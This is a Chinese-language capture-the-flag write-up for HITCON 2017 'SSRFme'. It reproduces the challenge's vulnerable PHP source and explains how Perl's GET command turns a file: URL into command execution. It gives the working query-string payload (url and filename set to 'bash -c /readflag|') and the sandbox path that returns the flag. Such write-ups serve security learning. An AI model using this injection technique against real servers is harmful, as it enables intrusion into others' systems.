# \[HITCON 2017]SSRFme

## \[HITCON 2017]SSRFme

## 考点

* perl脚本GET open命令漏洞

## wp

直接给出了代码

```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```

pathinfo函数以数组的形式返回关于文件路径的信息，返回的数组元素如下：

* \[dirname]：目录路径
* \[basename]：文件名
* \[extension]：文件后缀名
* \[filename]：不包括后缀的文件名

传入url参数，与`GET` 进行拼接后再执行

传入filename参数，新建filename文件，将执行的结果存在传入的文件中

GET是Lib for WWW in Perl的命令，底层调用了open，pen存在命令执行，并且还支持file函数

读取根目录`?url=/&filename=1`，可以看到得到的目录链接都是`file:///bin/`这种形式

由于是利用file协议，所以后面跟的payload必须以文件的形式存在，所以getshell时后面的filename参数要和执行的命令一样

```
?url=file:bash -c /readflag|&filename=bash -c /readflag|
```

再去访问`sandbox/230317844a87b41e353b096d0d6a5145/bash -c /readflag|`即可
